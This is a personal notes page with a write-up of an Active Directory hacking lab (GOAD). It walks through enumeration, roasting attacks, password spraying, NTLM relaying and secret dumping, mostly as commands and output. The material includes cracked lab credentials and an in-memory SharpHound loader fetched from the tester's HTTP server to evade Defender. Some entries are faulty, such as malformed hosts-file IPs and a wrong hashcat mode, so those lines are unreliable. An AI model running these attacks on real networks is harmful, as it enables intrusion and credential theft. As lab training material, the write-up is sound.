docs.title: Welcome to my notes
docs.text: Hello! Thanks for visiting my Markdown-notes page.

docs.title: About
docs.text:
I am twlttrtxt (a.k.a. Leon), someone with a burning passion for offensive cyber-security. This page serves as a central repository for all of my notes and write-ups on various CTF-challenges or other small projects which i have done.

Feel free to browse them and enjoy your stay!

docs.title: Structure
docs.text:
This repository is structured as follows: 

├───Active Directory
│   ├───Game of Active Directory
│   └───Setting up an AD
├───Burp Academy
├───HackTheBox-Writeups
│   ├───Machines
│   └───StartingPoint
├───Random Notes
└───TryHackMe-Notes
Each of these directories holds the following projects:

  • GOAD: Write-ups on the hacking lab from Orange-Cyberdefense
  • AD-Setup: A documentation on the process of setting up an AD-environment from scratch. Derived from udemy.
  • Burp Academy: Research notes from some learning paths of the portswigger academy.
  • HTB-Machines: In-depth writeups on various Hack The Box CTF's.
  • HTB-StartingPoint: In-depth writeups on all starting point CTF's on Hack The Box.
  • Random Notes: Simply notes on various topics that did not fit into any category.
  • TryHackMe-Notes: Research notes from TryHackMe modules.

docs.title: AI Notice
docs.text: I wanted to explicitly state that NO AI was used in the creation of my notes or this page, as everything is hand-crafted, the old-fashioned way.

docs.title: 1   AD Enumeration
docs.text:
First off, i will try to ping each IP address to see if they were set up correctly. The setup-script has given me these IP-addresses: 

+------------+--------------------------------+-------+-------------+
| PROXMOX ID |            VM NAME             | POWER |     IP      |
+------------+--------------------------------+-------+-------------+
|    107     | GOAD1dbf1f-router-debian11-x64 |  On   | 10.3.10.254 |
|    108     | GOAD1dbf1f-GOAD-DC01           |  On   | 10.3.10.10  |
|    109     | GOAD1dbf1f-GOAD-DC02           |  On   | 10.3.10.11  |
|    110     | GOAD1dbf1f-GOAD-DC03           |  On   | 10.3.10.12  |
|    111     | GOAD1dbf1f-GOAD-SRV02          |  On   | 10.3.10.22  |
|    112     | GOAD1dbf1f-GOAD-SRV03          |  On   | 10.3.10.23  |
|    113     | GOAD1dbf1f-kali                |  On   | 10.3.10.99  |
+------------+--------------------------------+-------+-------------+
I have created an ips.txt file to make further automation steps easier: 
10.3.10.10
10.3.10.11
10.3.10.12
10.3.10.22
10.3.10.23
Each virtual machine was reachable via ping! To make sure that there are no other hidden IP addresses in the network, i issued the following command: 
fping -g 10.3.10.0/24

docs.title: SMB Enumeration
docs.text:
The following command enumerates a IP-range for SMB services. This may find mis-configurations in the SMB service: 

nxc smb 10.3.10.0/24
The output shows the following information: 
SMB 10.3.10.12 445 MEEREEN [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)

SMB 10.3.10.11 445 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) 

SMB         10.3.10.10      445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) 

SMB 10.3.10.22 445 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) 

SMB 10.3.10.23 445 BRAAVOS [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
This tells me that there are 3 domains under the 5 machines. Therefore, 3 domain controllers should also be in place. The domains are these: 
- sevenkingdoms.local
- north.sevenkingdoms.local
- essos.local
It is also worth noting that CASTELBLACK and BRAAVOS do not use SMB signing, which allows for SMB-Relay attacks!

docs.title: DNS Enumeration
docs.text:
nslookup can be used to find out which servers are actually used as domain controllers. It can also be used for other scenarios: 

# Find Domain Controllers
nslookup -type=srv _ldap._tcp.dc._msdcs.<DOMAIN> <DNS_SRV>

# Find Principal Domain Controllers
nslookup -type=srv _ldap._tcp.pdc._msdcs.<DOMAIN> <DNS_SRV>

# Find Global Catalog (DC but with more data)
nslookup -type=srv gc._msdcs.<DOMAIN> <DNS_SRV>

# Find other Services
nslookup -type=srv _kerberos._tcp.<DOMAIN> <DNS_SRV>
nslookup -type=srv _kpasswd._tcp.<DOMAIN> <DNS_SRV>
nslookup -type=srv _ldap._tcp.<DOMAIN> <DNS_SRV>

These scans require the IP address of the DNS server (Typically the domain controller). If needed, they can be found using nmap: 

nmap -v -sV -p 53 10.3.10.0/24

# or, by using UDP:

nmap -v -sV -sU -p 53 10.3.10.0/24

If there are any reverse lookup zones configured in the DNS, the host-names can be found as follows: 

host <IP>
# OR
nslookup -type=ptr <IP>

This enumeration leads to the following information: 

10.3.10.10: KINGSLANDING -> DC01 in sevenkingdoms.local
10.3.10.11: WINTERFELL -> DC02 in north.sevenkingdoms.local
10.3.10.12: MEEREEN -> DC03 in essos.local
10.3.10.22: CASTELBLACK -> SRV02 in north.sevenkingdoms.local
10.3.10.23: BRAAVOS -> SRV03 in essos.local

These IPs can then be added to the /etc/hosts file using the following entries, so that local DNS resolution and Kerberos work properly: 

# GOAD
10.3.10.10.10 sevenkingdoms.local # additionally, due to it being a DC
10.3.10.10.10 kingslanding.sevenkingdoms.local
10.3.10.10.10 kingslanding

10.3.10.10.11 north.sevenkingdoms.local # additionally, due to it being a DC
10.3.10.10.11 winterfell.north.sevenkingdoms.local
10.3.10.10.11 winterfell

10.3.10.10.12 essos.local # additionally, due to it being a DC
10.3.10.10.12 meereen.essos.local
10.3.10.10.12 meereen

10.3.10.10.22 castelblack.north.sevenkingdoms.local
10.3.10.10.22 castelblack

10.3.10.10.23 braavos.essos.local
10.3.10.10.23 braavos

docs.title: NBT-NS
docs.text:
NetBIOS-NameServer is a standard protocol which acts as a fallback protocol for AD-environments for name resolution, if DNS may not be working. This protocol can be enumerated with the tools nbtscan and nmblookup: 

nbtscan -r 10.3.10.0/24

(1) 
  1. # does a reverse lookup on a IP-range

nmblookup -A <IP>
(1) 
  1. # finds names and workgroups from a IP address

docs.title: Responder
docs.text:
responder is a tool which is typically used to poison protocols which act as fallback for DNS (e.g. LLMNR, NBTNS, MDNS), or to do WPAD spoofing.

It is possible however, to also use responder in analyze mode to possibly find the following information:

  • Domain Controllers, SQL Servers, Workstations
  • Fully qualified domain names
  • Windows version
  • State (ENABLED / DISABLED) of protocols such as LLMNR, NBTNS, MDNS, LANMAN, ...

To analyze the network traffic, the following responder command can be used: 

responder --interface "eth0" --analyze

# or, shorter:

responder -I "eth0" -A

docs.title: Kerberos setup
docs.text:
First off, the tool krb5-user is required: 

sudo apt install krb5-user
... then, its configuration file /etc/krb5.conf must be edited as follows: 
[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }
  ...

To test if the setup was successful, the tool getTGT from the impacket suite may be used: 

impacket-getTGT essos.local/khal.drogo:horse

(1) 
  1. # gets the Ticket-granting-ticket for the user khal.drogo on the domain essos.local

export KRB5CCNAME=./khal.drogo.ccache
(1) 
  1. # the .ccache file location is saved in an environment variable, so that it can be used further by other tools

impacket-smbclient -k @braavos.essos.local
(1) 
  1. # authenticate using the kerberos TGT to the smb service of BRAAVOS

docs.title: NMAP
docs.text:
nmap is a great tool to map the offered service in a network. The following nmap scan was used on the ips.txt which i have saved before: 

sudo nmap -sCV -oA output -iL ips.txt

(1) 
  1. # -sCV: Use Default Scripts & Version Detection
# -oA: Use all output formats: gnmap, nmap, xml
# -iL: Input from List

These are the most interesting ports which should be looked out for in AD-environments:

  • 53/TCP and 53/UDP for DNS
  • 88/TCP for Kerberos authentication
  • 135/TCP and 135/UDP MS-RPC epmapper (EndPoint Mapper)
  • 137/TCP and 137/UDP for NBT-NS
  • 138/UDP for NetBIOS datagram service
  • 139/TCP for NetBIOS session service
  • 389/TCP for LDAP
  • 636/TCP for LDAPS (LDAP over TLS/SSL)
  • 445/TCP and 445/UDP for SMB
  • 464/TCP and 445/UDP for Kerberos password change
  • 3268/TCP for LDAP Global Catalog
  • 3269/TCP for LDAP Global Catalog over TLS/SSL

nmap may also be used to scan for domain controllers using the following command: 

nmap -sS -n --open -p 88,389 10.3.10.0/24

(1) 
  1. # -sS: for TCP SYN scan 
# -n: for no name resolution 
# --open: to only show (possibly) open port(s) 
# -p for port(s) number(s) to scan

It also offers nice scripts which can be used to possibly find information on active users. These can be used using the following nmap scan: 

nmap -n -sV --script "ldap* and not brute" -p 389 <IP> --script-args="ldap.maxobjects=300" -oA output

(1) 
  1. # -n: Never do DNS Resolution
# -sV: Version Detection
# --script: Use following scripts
# -p 389: only scan port 389
# ldap.maxobjects=300: not only the first 20, but more
# -oA: output into all formats

Another script of nmap may be also used to enumerate DHCP hosts: 

nmap -n -sV --script broadcast-dhcp-discover <IP> -oA output

(1) 
  1. # -n: Never do DNS Resolution
# -sV: Version Detection
# --script: Use following script
# -oA: output into all formats

docs.title: RPC / SMB
docs.text:
Anonymous RPC sessions can be enabled in the Windows registry under Software\\Policies\\Microsoft\\Windows NT\\Rpc: Restrict Unauthenticated RPC Clients. For anonymous SMB sessions, the registry can be found under Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Controls\Lsa. If this is registry flag is set to true, the following commands can be used to enumerate the smb or the rpc service: 

nxc smb 10.3.10.11 --users

(1) 
  1. # --users: a flag which tells nxc to return a list of available users.

Alternatively, these tools may also be used: 

enum4linux 10.3.10.11

# or

rpcclient -U "north\\" 10.3.10.11 -N

After anonymously scanning DC02 (WINTERFELL) for --users, i receive the credentials samwell.tarly:Heartsbane, which are stored as clear-text in a comment. These credentials can be used in another nxc --users scan to find the following users: 

Administrator
Guest
krbtgt
localuser
arya.stark
eddard.stark
catelyn.stark
robb.stark
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly
jeor.mormont
sql_svc

docs.title: Kerberos
docs.text:
If anonymous RPC sessions are allowed, it is also possible to enumerate the users using Kerberos. As GOAD is game-of-thrones themed, a word-list of the cast can be used: 

curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > users.txt

The nmap script krb5-enum-users can then be used to enumerate the users using Kerberos, and this does not increment the -BadPW- count: 

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=users.txt" 10.3.10.10

(1) 
  1. # for WINTERFELL, set realm to 'north.sevenkingdoms.local', and IP to 10.3.10.11
# for MEEREEN, set realm to 'essos.local', and IP to 10.3.10.12

The following users were enumerated on DC01 (KINGSLANDING): 

robert.baratheon@sevenkingdoms.local
stannis.baratheon@sevenkingdoms.local
cersei.lannister@sevenkingdoms.local
renly.baratheon@sevenkingdoms.local
joffrey.baratheon@sevenkingdoms.local
jaime.lannister@sevenkingdoms.local
tywin.lannister@sevenkingdoms.local

The following users were enumerated on DC02 (WINTERFELL): 

catelyn.stark@north.sevenkingdoms.local
jeor.mormont@north.sevenkingdoms.local
jon.snow@north.sevenkingdoms.local
sansa.stark@north.sevenkingdoms.local
rickon.stark@north.sevenkingdoms.local
samwell.tarly@north.sevenkingdoms.local
arya.stark@north.sevenkingdoms.local
hodor@north.sevenkingdoms.local
robb.stark@north.sevenkingdoms.local

The following users were enumerated on DC03 (MEEREEN): 

jorah.mormont@essos.local
viserys.targaryen@essos.local
missandei@essos.local
khal.drogo@essos.local
daenerys.targaryen@essos.local

docs.title: SMB Guest Shares
docs.text:
Some SMB shares allow Guest access. To find shares that do this, the following netexec command may be used: 

nxc smb 10.3.10.10-23 -u 'a' -p '' --shares

(1) 
  1. # -u: the username to use. "a" resolves to Guest
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.

A share was found on CASTELBLACK named all which is readable by the Guest account. It can be interacted with as follows: 

smbclient -U 'a' --no-pass "//10.3.10.22/all"

(1) 
  1. # -U: username to use. here 'a', as it resolves to `Guest`
# --no-pass: do not use a password

Using get on the file arya.txt reveals the clear-text credentials arya.stark:Needle.

docs.title: ASREP-roasting
docs.text:
This technique tries to find users which do not have Kerberos pre-authentication enabled (the flag UF_DONT_REQUIRE_PREAUTH is set). For this attack, authentication requests (AS-REQ) are sent to the domain controller. If this pre-authentication flag is not set, the domain controller will reply with the ticket-granting-ticket (TGT) of that user. If the used password is weak, these TGT's can then be cracked to receive the clear-text password.

For this, a list of valid users is required. It can be gathered using previous anonymous enumeration techniques. The command to execute ASREP-roasting is the following: 

impacket-GetNPUsers sevenkingdoms.local/ -no-pass -usersfile users.txt

(1) 
  1. # also try with 'north.sevenkingdoms.local' and `essos.local`

It turns out that the two users missandei@essos.local and brandon.stark@north.sevenkingdoms.local do not have this Kerberos flag set. Their TGT hashes can then be cracked using mode 18200 (Kerberos 5, etype 23, AS-REP) of the tool hashcat: 

hashcat -m 18200 ./hash.txt ./rockyou.txt

The received clear-text passwords are these: 

brandon.stark:iseedeadpeople
missandrei:fr3edom

docs.title: Responder
docs.text:
responder may be used to listen to the local network for DNS fallback protocols such as LLMR (Link Local Multicast Resolution). These fallback protocols are used if DNS fails, for example if someone searches for a non-existent domain. responder may act as an server which does provide these resources, but starts a challenge-response interaction for them, which results in a NTLMv2 hash if someone mis-types a domain name.

To start a LLMNR attack, the following responder command can be used: 

sudo responder -I eth0 -wF -v

(1) 
  1. # -w: enables WPAD rogue proxy server. responds to WPAD requests
# -f: enforces authentication, which leads to NTLMv2 hashes

After waiting a while, the NTLMv2 hashes of the users eddard.stark and robb.stark are captured. These can only be attempted to be cracked, as they can not be passed onto other services. To crack these, the mode 5600 (NetNTLMv2) of hashcat can be used: 

hashcat -m 18200 ./hash.txt ./rockyou.txt

This leads to the credentials robb.stark:sexywolfy!

docs.title: Password Spraying
docs.text:
A typical username = password password spraying attack may be used as follows: 

nxc smb 10.3.10.10-23 -u users.txt -p users.txt --no-bruteforce

(1) 
  1. # --no-bruteforce: only uses user1:pass1, user2:pass2, and so on.

This leads to the credentials of hodor:hodor!

Alternatively, a password spraying attack using weak passwords can be used. A nice guess for passwords may be the format SEASON:YEAR, or COMPANY_NAME:YEAR. As game of thrones typically is associated with winter, i have tried these passwords: 

Winter2018
Winter2019
Winter2020
Winter2021
Winter2022
Winter2023
Winter2024
Winter2025
With the following nxc command: 
nxc smb 10.3.10.10-23 -u users.txt -p passwords.txt
This gave me the new account rickon.stark:Winter2022.

docs.title: Summary of users
docs.text:
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password

docs.title: 3   Authenticated User Enumeration
docs.text:
If one valid account is found, the impacket tool GetADUsers can be used to get a list of all valid users. This tool achieves that using automated LDAP queries. It can be used with an account like this: 

impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople

(1) 
  1. # also try with ESSOS.LOCAL/missandei:fr3edom

docs.title: Manual LDAP queries
docs.text:
It is also possible to issue manual LDAP queries to get more information out of the domain controllers using the tool ldapsearch as follows: 

ldapsearch -H ldap://10.3.10.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "<LDAP_Query>" | grep 'name'

(1) 
  1. # -H: LDAP URI (Host)
# -D: Domain Name
# -w: Password
# -b: LDAP query. Also try 'DC=sevenkingdoms,DC=local' and `DC=essos,DC=local`

If a trusted link between multiple domains exist, they can also be passed into the -d parameter for enumeration. The following LDAP query which lists all users of a domain: 

"(&(objectCategory=person)(objectClass=user))"
This query works for the DC01 (KINGSLANDING), and the DC02(WINTERFELL), and returns all users. There are many more LDAP queries which may be used, found here. They can be used to find more information about delegations, GPOs, groups, trusts, and so on.

An alternative to ldapsearc can be netexec, as it can also be used to send LDAP queries as follows: 

nxc ldap 10.3.10.11 -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' -d 'essos.local' --query "<LDAP_Query>" "" | grep 'name'

(1) 
  1. # also allows for enumeration of other domains

docs.title: Kerberoasting
docs.text:
Kerberoasting is the act of specifically searching for users which have a registered Service Principal Name (SPN). These are typically service accounts for the SQL server or IIS application. For these accounts, a Kerberos Ticket Granting Service (TGS) can be requested, which is usually a normal operation in an AD environment. These tickets may be cracked offline!

The tool for Kerberoasting is GetUserSPNs from the impacket suite and it is usable as follows: 

impacket-GetUserSPNs north.sevenkingdoms.local\brandon.stark:iseedeadpeople -dc-ip 10.3.10.11 -request
Alternatively, netexec may also be used to do this task: 
nxc ldap 10.3.10.11 -u 'brandon.stark' -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting hash.txt

Using this technique, i have gathered the Kerberos tickets for the users sansa.stark, sql_svc and jon.snow. A cracking attempt can now be made to get the clear-text password for these accounts. The tool for this job will be hashcat in mode 13100 (Kerberos 5, etype 23, TGS-REP). This command then attempts cracking the hashes: 

hashcat -m 13100 ./hash.txt ./rockyou.txt
This gave me the new clear-text credentials of NORTH/jon.snow:iknownothing.

docs.title: Authenticated Share enumeration
docs.text:
Using valid credentials, the available SMB shares may be enumerated once again to find out if some accounts may have more READing or WRITEing privileges using this command: 

nxc smb 10.3.10.10-23 -u 'brandon.stark' -p 'iseedeadpeople' -d north.sevenkingdoms.local --shares
After trying this with other accounts, the account of robb.stark is able to access the SYSVOL share on WINTERFELL: 
smbclient -U 'NORTH\robb.stark' --password='sexywolfy' "//north.sevenkingdoms.local/SYSVOL"

The SYSVOL share may hold scripts which can leak clear-text credentials. And in this case, i have found script.ps1 and secret.ps1, which reveal the clear-text credentials for NORTH/jeor.mormont:_L0ngCl@w_.

docs.title: DNS Dump
docs.text:
It may be also possible to enumerate the integrated DNS in an active-directory environment using these commands: 

adidnsdump -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' winterfell.north.sevenkingdoms.local

# alternatively:

bloodyAD --host "10.3.10.11" -d "north.sevenkingdoms.local" -u "brandon.stark" -p "iseedeadpeople" get dnsDump

# alternatively:

nxc smb -u 'brandon.stark' -p 'iseedeadpeople' -d 'north.sevenkingdoms.local' -M enum_dns

docs.title: Bloodhound
docs.text:
bloodhound is a tool which uses multiple LDAP queries to create a big ZIP file containing information about the active directory environment. This ZIP can then be uploaded to the bloodhound GUI, where a mapping of all users and their permissions can be viewed to find privilege escalation or lateral movement paths.

To collect this data, a so-called ingestor (collector) is required. If code execution on the machine is not present, it can be achieved remotely using bloodhound-python, or netexec's built-in ingestor as follows: 

bloodhound-python -d north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' -dc winterfell.north.sevenkingdoms.local  --zip -c All -ns 10.3.10.11

(1) 
  1. # -c: Collection methods: All
# -ns: DNS server IP, for correct name resolution (usually DC)

# alternatively, netexec:

nxc ldap north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' --bloodhound --collection All --dns-server 10.3.10.11
(1) 
  1. # --bloodhound: perform multiple `LDAP` scans to save in a file which can be investigated with bloodhound
# --collection All: Collection methods: All
# --dns-server: DNS server IP, for correct name resolution (usually DC)

The problem with these remote ingestors is that they do not collect all data. A collector which returns a more complete dataset is SharpHound. As this collector is an executable file which needs to run on the target, code execution on the machine is required. Protocols which enable code execution are Remote Desktop or winrm. A connection can be set-up as follows: 

xfreerdp3 /u:brandon.stark /p:iseedeadpeople /d:north.sevenkingdoms.local /v:10.3.10.11 /cert:ignore

# or winrm:

evil-winrm -i 10.3.10.11 -u brandon.stark -p iseedeadpeople

The SharpHound.exe must be downloaded from the SharpHound GitHub, and unzipped. For a Remote Desktop session, the exe can be put on the system using simple Copy-Paste, and for the winrm session, the command upload SharpHound.exe . can be used. To execute the binary on the target, this command may be used: 

./SharpHound.exe -d north.sevenkingdoms.local -c All --OutputDirectory C:\ --ZipFileName north.zip

(1) 
  1. # also execute this for 'sevenkingdoms.local' and 'essos.local'

The resulting ZIP files may then be inspected for dangerous permissions of users.

The problem with this upload of the file is that Windows Defender will block any suspicious file from landing on the file-system using signature checks! Therefore, an alternative approach of executing Sharphound is to be running it entirely in memory and not placing any malicious .exe on the disk. To do so, the file must be served in a python3 -m http.server. It can then be fetched into memory and executed using the following commands: 

$data = (New-Object System.Net.WebClient).DownloadData('http://<my-IP>:<port>/SharpHound.exe')
This fetches the SharpHound.exe file from the http server and stores it in the variable $data. The following command is used to load the data into memory: 
$assem = [System.Reflection.Assembly]::Load($data)
And lastly, the binary can be executed as follows: 
[Sharphound.Program]::Main(@("-d","north.sevenkingdoms.local","-c","All","--OutputDirectory","C:\","--ZipFileName","north.zip"))

(1) 
  1. # also execute this for 'sevenkingdoms.local' and 'essos.local'

AMSI (Anti Malware Scan Interface) may block this attempt. It was not the case in the testing, but if AMSI were present, it can be bypassed. A blog post describes this bypass very nicely.

To install the actual bloodhound-gui, the following command can be issued on debian machines: 

sudo apt update && sudo apt install -y bloodhound
The setup is pretty self-explanatory: 
sudo bloodhound-setup

# and then:

sudo bloodhound-start

Some tips and tricks for the usage of bloodhound are:

  • By searching a user where the credentials are known, the Outbound Object Permissions show you all permissions on other objects which apply to the current user.
  • Clicking the lines on dangerous permissions shows you the step-by-step exploitation steps.
  • Under PATHFINDING a start/target can be set to show you the quickest way to that target.
  • A user can be right-clicked and the option Mark User as Owned can be used to mark that you have access to this user.
  • The Shortes Paths to Here from Owned Principals can be used to easily find exploitation paths to e.g. Administrator.
  • Notes can be used to note down clear-text passwords.

docs.title: Cypher-queries
docs.text:
bloodhound allows you to query the data using a language called cypher (similar to SQL, but for graph data). These queries may show interesting information: 

MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p

(1) 
  1. # > Shows all domains and computers

MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
(1) 
  1. # > Shows all domains and users

MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
(1) 
  1. # > Shows a map of domains / groups and their relationships

MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
(1) 
  1. # > Shows access controls of the AD

MATCH (n:User {name: "USERNAME@DOMAIN.LOCAL"})-[r]->(m)
RETURN n, r, m
(1) 
  1. # > Shows all outgoing paths from a user

These are only a few, but more can be found here and here!

docs.title: GenericAll Abuse
docs.text:
If a user has GenericAll privileges over another user, multiple attack scenarios open up. A targeted Kerberoast is made possible. In the test-lab, the user MISSANDEI@ESSOS.LOCAL has GenericAll permissions over the account KHAL.DROGO@ESSOS.LOCAL. To do the targeted Kerberoast, the tool targetedKerberoast.py from this Github may be used as follows after using git clone on it: 

python3 ./targetedKerberoast.py -v -d 'essos.local' -u 'missandei' -p 'fr3edom'

The Kerberos hash of this user is once again gained, which can be cracked using mode 13100 (Kerberos 5, etype 23, TGS-REP) of hashcat as follows: 

hascat -m 13100 ./hash.txt ./rockyou.txt
This gives me the new credentials of khal.drogo:horse.

docs.title: Summary of users
docs.text:
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password

#-- New users: --
NORTH/jon.snow:iknownothing  # Kerberoasting, Hash cracked
NORTH/jeor.mormont:_L0ngCl@w_ # Cleartext Password in SYSVOL share
ESSOS/khal.drogo:horse # targeted Kerberoast, Hash cracked

docs.title: 4   Poisoning and Relaying
docs.text: Chapter 2 of this project has shown that responder was able to capture NetNTLMv2 hashes, where one of them (of eddard.stark) was not crack-able due to the password being strong. It is still possible however, to relay that NetNTLMv2 hash to another protocol which supports NTLM authentication (e.g. SMB, HTTP, LDAP, MSSQL, RDP).

docs.title: NTLM Relaying
docs.text:
The process of the NTLM relay looks roughly like this: 

# LLMNR

1. Eddard --[Give me the IP address to Meren]--> DNS
2. Eddard <--[I dont know Meren]-- DNS
3. Eddard --[Does anyone know Meren (LLMNR)]--> (Everyone in the network)
4. Eddard <--[I am Meren, here is my IP]-- Attacker

# Capturing NTLM Hash

1. Eddard --[I am Eddard, i want to authenticate to Meren]--> Attacker
2. Attacker --[I am Eddard, i want to authenticate to Meereen]--> Meereen
3. Attacker <--[Here is the NTLM challenge]-- Meereen
4. Eddard <--[Here is the NTLM challenge]-- Attacker
5. Eddard --[Here is my NETNTLMv2 Hash]--> Hacker

# The hash was captured, but cracking it was not successful
# therefore, attempt NTLM Relaying

1. Attacker --[Here is my NETNTLMv2 Hash]--> Meereen
2. Attacker <--[Thanks Eddard, here is your session]-- Meereen

SMB is the prime target for NTLM-Relays, as it's session provides a lot of possibilities for exploitation. Therefore SMB-signing must not be enforced, or this relay will fail. netexec provides the possibility to scan a wide IP-range for targets which do not enforce SMB-signing: 

nxc smb 10.3.10.10-23 --gen-relay-list output.txt
The created output.txt holds all SMB hosts which are vulnerable to NTLM-Relaying. Within that file, SRV03 (Braavos) and SRV02(CASTELBLACK) are the targets.

To prepare for NTLM-Relaying, the config file of responder must be edited. A short command automatically finds this file and edits it: 

find / -name "Responder.conf" 2&>0 -exec sudo vim {} \;
The following tweaks to it must be made: 
...
; Servers to start
SQL      = On
SMB      = Off # was On!
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off # was On!
HTTPS    = On
DNS      = On
...
This must be done to prevent responder from capturing the hashes, as we want to relay them and not capture them.

The relaying server can be started using the tool ntlmrelayx of the impacket suite. The command to do so looks like this: 

impacket-ntlmrelayx -tf output.txt --keep-relaying -smb2support -socks

(1) 
  1. # -tf: file of IPs that are vulnerable to NTLM relaying
# --keep-relaying: do not stop after successful relay
# -smb2support: use SMBv2 instead of legacy SMB
# -socks: start integrated socks proxy

Before starting responder to relay NTLM hashes to SMB, make sure to edit the config file of proxychains (located at /etc/proxychains4.conf), as ntlmrelayx starts a socks server on port 1080, and the default configuration may open a port on 9050: 

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080 # Changed from 9050!
Alternatively, ntlmrelayx may also be started using the additional flag to match the proxychains port: 
-socks-port 9050

And lastly, responder can be started to listen for the initial mis-typing of the domain Meereen by the user eddard.stark: 

sudo responder -I eth0

This starts the chain-reaction which leads to the interception of eddard.stark's session using his NetNTLMv2 hash! The socks request within ntlmrelayx should look like this: 

Protocol  Target      Username            AdminStatus  Port 
--------  ----------  ------------------  -----------  ----
SMB       10.3.10.23  NORTH/EDDARD.STARK  FALSE        445  
SMB       10.3.10.23  NORTH/ROBB.STARK    FALSE        445  
SMB       10.3.10.22  NORTH/EDDARD.STARK  TRUE         445  
SMB       10.3.10.22  NORTH/ROBB.STARK    FALSE        445
To test this connection, a smbclient session may be started using eddard.stark's NetNTLMv2 hash through the socks proxy as follows: 
proxychains impacket-smbclient -no-pass 'north'/'eddard.stark'@'10.3.10.22'

docs.title: Gathering Secrets
docs.text:
Luckily enough eddard.stark has the AdminStatus flag set to TRUE on SRV02(CASTELBLACK). This means that he is a Administrator account on that system. That information allows us to execute the tool secretsdump from the impacket suite, which uses these Administrator privilege to dump various nice things from the server. It's syntax looks roughly like this: 

proxychains impacket-secretsdump -no-pass 'north'/'eddard.stark'@'10.3.10.22'

These are some of the things which are gathered from this tool:

  • Security Account Manager (SAM) database dump: Password hashes for local accounts (not necessarily domain accounts!), which can be passed using Pass-The-Hash.

  • Cached Domain Logon Information: Cached password hashes of domain users which were recently logged on

  • Local Security Authority (LSA) Secrets: Machine password, encryption- and decryption key

  • _SC_MSSQL$SQLEXPRESS: The clear-text password of the service account sql_svc, which is sql_svc:YouWillNotKerboroast1ngMeeeeee

The user accounts exposed in the SAM database dump follow the structure of domain\uid:rid:lmhash:nthash. An attempt was made to crack them using mode 1000 of hashcat (NTLM), but with no success. The NTHash part can still be used for Pass-The-Hash attacks though!

docs.title: Alternative tools
docs.text:
Alternatively, the tool lsassy can dump the Local Security Authority Subsystem Service (LSASS). In there, hashed passwords (for cracking or PtH), clear-text passwords or TGT's can be found. This command executes lsassy using the relayed NTLM hash: 

proxychains lsassy --no-pass -d north.sevenkingdoms.local -u eddard.stark 10.3.10.22

donpapi is another nice secret-gathering tool, as it remotely dumps the Windows Data Protection API (DPAPI). In there, cached browser credentials / cookies, windows certificates or credentials from different sources may be found. The following command uses the socks proxy again, to dump the DPAPI: 

proxychains donpapi collect -t '10.3.10.22' -d 'north.sevenkingdoms.local' -u 'eddard.stark' --no-pass

It is also possible to get code execution via smb by passing the NTLM hash to receive a semi-interactive shell using the tool smbexec from the impacket suite: 

proxychains impacket-smbexec -no-pass 'NORTH'/'eddard.stark'@'10.3.10.22'

docs.title: DHCPv6 Spoofing & Poisoning
docs.text:
